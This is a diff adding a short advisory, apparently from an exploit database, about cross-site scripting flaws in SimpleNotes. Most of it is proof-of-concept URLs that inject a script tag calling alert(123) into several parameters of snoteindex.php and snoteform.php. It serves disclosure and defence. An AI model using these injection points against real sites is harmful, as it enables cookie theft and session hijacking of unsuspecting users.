@@ -1,0 +1,22 @@
+source: http://www.securityfocus.com/bid/29755/info
+
+SimpleNotes is prone to multiple cross-site scripting vulnerabilities because it fails to sufficiently sanitize user-supplied data.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.
+
+http://www.example.com/path/snoteindex.php?RootID=[XSS]
+http://www.example.com/path/snoteindex.php?RootID=></a></td><script>alert(123)</script>
+http://www.example.com/path/snoteindex.php?RootID=1&SnoteID=[XSS]
+http://www.example.com/path/snoteindex.php?RootID=1&SnoteID=></a></td><script>alert(123)</script>
+http://www.example.com/path/snoteindex.php?RootID=1&SnoteID=1&mode=list&action=selectedit&MaxLevel=[XSS]
+http://www.example.com/path/snoteindex.php?RootID=1&SnoteID=1&mode=list&action=selectedit&MaxLevel=></a></td><script>alert(123)</script>
+http://www.example.com/path/snoteindex.php?RootID=1&SnoteID=1&mode=list&action=selectedit&MaxLevel=100&MoveWhat=[XSS]
+http://www.example.com/path/snoteindex.php?RootID=1&SnoteID=1&mode=list&action=selectedit&MaxLevel=100&MoveWhat=></a></td><script>alert(123)</script>
+http://www.example.com/path/snoteform.php?RootID=[XSS]
+http://www.example.com/path/snoteform.php?RootID="></a></td><script>alert(123)</script>
+http://www.example.com/path/snoteform.php?RootID=1&SnoteID=[XSS]
+http://www.example.com/path/snoteform.php?RootID=1&SnoteID="></a></td><script>alert(123)</script>
+http://www.example.com/path/snoteform.php?RootID=1&SnoteID=1&mode=list&action=selectedit&MaxLevel=[XSS]
+http://www.example.com/path/snoteform.php?RootID=1&SnoteID=1&mode=list&action=selectedit&MaxLevel="></a></td><script>alert(123)</script>
+http://www.example.com/path/snoteform.php?RootID=1&SnoteID=1&mode=list&action=selectedit&MaxLevel=100&MoveWhat=[XSS]
+http://www.example.com/path/snoteform.php?RootID=1&SnoteID=1&mode=list&action=selectedit&MaxLevel=100&MoveWhat="></a></td><script>alert(123)</script>
